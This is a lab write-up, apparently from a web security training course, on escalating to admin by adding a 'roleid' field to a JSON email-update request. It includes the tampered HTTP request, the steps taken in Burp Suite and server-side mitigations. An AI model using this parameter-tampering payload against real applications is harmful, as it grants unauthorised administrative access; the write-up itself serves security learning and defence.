## 🧪 Lab: User Role Can Be Modified in User Profile  
**Level**: Apprentice  
**Date**: July 29, 2025  
**Goal**: Gain admin access by modifying your own role through user-controlled request parameters.

---

### 🧰 Tools  
- Burp Suite  
- Repeater  
- Browser  

---

### 🧭 Steps  

1. Logged in using provided credentials:  
   ```
   Username: wiener  
   Password: peter  
   ```

2. Navigated to `/my-account` page.  
   - It showed a form for updating the **email address**.  
   - Observed that the response contained a `"roleid"` parameter in the returned JSON.

3. Intercepted the **email update request** in Burp Suite.  
   - Sent it to **Repeater**.  
   - Modified the request body to inject `"roleid": 2`, like this:  
     ```json
     {
       "email": "wiener@exploit.com",
       "roleid": 2
     }
     ```

4. Forwarded the modified request and observed the server accepted it.  
   - The response now showed `"roleid": 2`, indicating elevated privileges.

5. Navigated to `/admin` endpoint.  
   - Successfully accessed the admin panel.

6. Deleted user `carlos` to complete the lab.  
   ✅ **Lab solved successfully**.

---

### 🧪 Payload (Request Example)  
```http
POST /my-account/change-email HTTP/1.1  
Host: your-lab-id.web-security-academy.net  
Content-Type: application/json  
Cookie: session=your-session-id  

{
  "email": "attacker@example.com",
  "roleid": 2
}
```

---

### 💡 Observations  

- The server **implicitly trusted user-submitted JSON** data for sensitive fields like `roleid`.  
- There was **no server-side validation** preventing privilege escalation.  
- Changing the role directly through a POST request reveals weak access control on critical parameters.

---

### 🛡️ Mitigation  

- ❌ Never allow users to modify sensitive fields like roles, privileges, or user IDs from the frontend.  
- ✅ Implement strict **server-side validation** and filtering for any updatable fields.  
- ✅ Maintain **immutable role assignments** for users in secure server-side storage.  
- ✅ Use proper **RBAC (Role-Based Access Control)** where role logic is enforced on the server, regardless of client input.  
- ✅ Avoid reflecting or re-using sensitive values from client data in backend logic.  
- ✅ Add privilege checks to every critical route or backend controller.

---

### 📘 Reflection  

This lab highlighted how even basic update functionality can be abused when sensitive values like roles are handled on the client side.  
A single extra JSON field was enough to escalate privileges — reminding us that **never trust client-side input**, especially in access control decisions.  
Simple flaws like this often lead to powerful exploits when overlooked.

---
